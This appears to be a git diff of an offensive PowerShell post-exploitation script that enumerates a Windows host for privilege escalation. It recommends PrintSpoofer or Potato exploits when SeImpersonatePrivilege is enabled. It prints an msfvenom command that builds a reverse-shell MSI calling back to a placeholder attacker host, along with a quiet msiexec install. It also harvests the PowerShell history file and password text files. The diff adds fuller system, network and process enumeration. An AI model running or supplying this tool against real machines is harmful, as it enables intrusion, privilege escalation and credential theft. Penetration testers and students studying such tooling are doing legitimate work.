@@ -62,7 +62,6 @@ if ($OutFile -ne "") {
   if ($priv.Length -gt 0) {
     Write-Host "[+] SeImpersonatePrivilege is enabled! Elevate those privileges with PrintSpoofer or a Potato derivative!"
     Write-OutFile -Data "[+] SeImpersonatePrivilege is enabled! Elevate those privileges with PrintSpoofer or a Potato derivative!" -OutFile $Outf -Header "SeImpersonatePrivilege"
-    # Read-Host -Prompt "Press Enter to continue..."
     Write-Host ""
   }
 
@@ -75,7 +74,6 @@ if ($OutFile -ne "") {
     Write-OutFile -Data "[+] msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi" -OutFile $Outf
     Write-Host "[+] msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi"
     Write-OutFile -Data "[+] msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi" -OutFile $Outf
-    # Read-Host -Prompt "Press Enter to continue..."
     Write-Host ""
   }
 
@@ -101,7 +99,6 @@ if ($OutFile -ne "") {
   if ($null -ne $content) {
     Write-Host "[+] Found ConsoleHost_history.txt! Writing to $Outf."
     Write-Outfile -Data $content -OutFile $Outf -Header "History File"
-    # Read-Host -Prompt "Press Enter to continue..."
   }
 
   # Password files in user directory.
@@ -111,26 +108,50 @@ if ($OutFile -ne "") {
   if ($null -ne $pwf) {
     $pwf | Write-Host
     Write-Outfile -Data $pwf -OutFile $Outf -Header "Password Text Files"
-    # Read-Host -Prompt "Press Enter to continue..."
     Write-Host ""
   }
+
+  Write-Host "[*] End of low hanging fruit."
 
   ### Standard Enumeration
   Write-Host "[*] Beginning standard enumeration of asset."
   Write-Outfile -Header "Standard Enumeration" -Outfile $Outf
-
   $username = $env:USERNAME
   $hostname = hostname
   $a = $hostname + '\' + $username
   $users = Get-LocalUser | select-object -Property name | Out-String
   $group = get-localgroup | select-object -property name | out-string
   $mygroups = $(whoami /groups) -join "`r`n"
-  $sys = $(systeminfo) -join "`r`n" #implement
-  $ips = $(ipconfig /all) -join "`r`n" #implement
-  $route = $(route print) -join "`r`n"#implement
-  $conn = $(netstat -nao) -join "`r`n"#implement
-  $process = Get-Process #implement
+  $sys = $(systeminfo) -join "`r`n" 
+  $ips = $(ipconfig /all) -join "`r`n" 
+  $route = $(route print) -join "`r`n"
+  $conn = $(netstat -nao) -join "`r`n"
+  $process = Get-Process | Out-String
 
+  Write-Host "[*] System Enumeration."
+  Write-Host "Systeminfo"
+  $sys | Write-Host
+  Write-OutFile -Data $sys -Outfile $Outf -Header "Systeminfo"
+  Write-Host ""
+  Write-Host "IP All:"
+  $ips | Write-Host
+  Write-Outfile -Data $ips -Outfile $Outf -Header "IP All"
+  Write-Host ""
+  Write-Host "Routes:"
+  $route | Write-Host
+  Write-Outfile -Data $route -Outfile $Outf -Header "Routes"
+  Write-Host ""
+  Write-Host "Netstat"
+  $conn | Write-Host
+  Write-Outfile -Data $conn -Outfile $Outf -Header "Netstat"
+  Write-Host ""
+  Write-Host "Processes:"
+  $process | Write-Host
+  Write-Outfile -Data $process -Outfile $Outf -Header "Processes"
+  Write-Host ""
+
+  Write-Host "[*] User Enumeration."
+  Write-Host ""
 
   Write-Host "Username: $username"
   Write-Host "Hostname: $hostname"
